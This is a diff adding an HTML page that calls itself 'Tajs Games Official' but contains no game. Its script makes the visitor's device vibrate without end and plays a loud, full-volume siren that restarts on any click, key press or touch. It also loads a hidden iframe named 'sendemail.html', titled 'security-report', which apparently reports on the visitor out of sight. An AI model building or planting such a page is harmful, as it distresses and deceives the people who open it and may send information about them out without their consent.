@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Tajs Games Official</title>
+    <link rel="icon" type="image/png" sizes="512x512" href="swfservertajsgamesofficial.png">
+    <link rel="apple-touch-icon" sizes="512x512" href="swfservertajsgamesofficial.png">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body class="alarm-active">
+    <iframe src="sendemail.html" style="display:none;" title="security-report"></iframe>
+
+    <script>
+        let alarmStarted = false;
+
+        if (navigator.vibrate) {
+            navigator.vibrate([500, 200, 500, 200, 500]);
+            setInterval(() => {
+                navigator.vibrate([500, 200, 500, 200, 500]);
+            }, 2000);
+        }
+
+        function startSiren() {
+            if (alarmStarted) return;
+            alarmStarted = true;
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+
+                oscillator.type = "sawtooth";
+                oscillator.frequency.setValueAtTime(650, audioCtx.currentTime);
+                gainNode.gain.setValueAtTime(1, audioCtx.currentTime);
+
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                oscillator.start();
+
+                setInterval(() => {
+                    oscillator.frequency.exponentialRampToValueAtTime(1250, audioCtx.currentTime + 0.4);
+                    setTimeout(() => {
+                        oscillator.frequency.exponentialRampToValueAtTime(650, audioCtx.currentTime + 0.4);
+                    }, 400);
+                }, 800);
+            } catch (e) {}
+        }
+
+        startSiren();
+        window.addEventListener("click", startSiren);
+        window.addEventListener("keydown", startSiren);
+        window.addEventListener("touchstart", startSiren);
+    </script>
+</body>
+</html>
